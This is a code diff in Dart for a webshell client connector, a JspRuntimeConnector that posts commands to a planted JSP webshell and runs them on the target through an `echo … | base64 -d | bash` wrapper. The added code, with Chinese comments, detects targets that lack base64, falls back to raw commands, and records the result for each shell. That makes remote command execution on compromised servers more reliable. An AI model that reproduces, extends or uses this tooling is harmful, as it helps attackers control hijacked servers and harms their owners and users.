@@ -47,11 +47,20 @@ class JspRuntimeConnector extends ShellExecConnector {
     return 'echo ${_sq(b64)} | base64 -d | bash';
   }
 
+  /// 目标上是否还有 `base64`。精简单镜像（删掉 coreutils / busybox 精简）里没有，
+  /// 而本连接器默认把命令包成 `echo … | base64 -d | bash`——没有 base64 时
+  /// 命令会静默不执行，表现为"shell 连上了但永远返回空"。
+  /// 首次失败后降级为直接传原文命令，并记住结论（每个 shell 只探测一次）。
+  bool? _hasBase64;
+
   Future<String> _requestRuntime(String cmd, {Duration? timeout}) async {
     final t = timeout ?? const Duration(seconds: 30);
     try {
       final uri = Uri.parse(webshell.url);
-      final payload = _transportWrappedScript(_cmdForJsp(cmd));
+      final useBase64 = _hasBase64 ?? true;
+      final payload = useBase64
+          ? _transportWrappedScript(_cmdForJsp(cmd))
+          : _cmdForJsp(cmd);
 
       final response = await _client
           .post(
@@ -70,7 +79,14 @@ class JspRuntimeConnector extends ShellExecConnector {
       if (response.statusCode != 200) {
         return '[HTTP ${response.statusCode}]';
       }
-      return _stripPre(decodeWithFallback(response.bodyBytes));
+      final out = _stripPre(decodeWithFallback(response.bodyBytes));
+      if (useBase64 && out.isEmpty && _hasBase64 == null) {
+        // 第一次就空：极可能是没有 base64。降级重试一次原文命令。
+        _hasBase64 = false;
+        return _requestRuntime(cmd, timeout: t);
+      }
+      _hasBase64 ??= true;
+      return out;
     } on TimeoutException {
       return '[Timeout]';
     } on http.ClientException catch (e) {
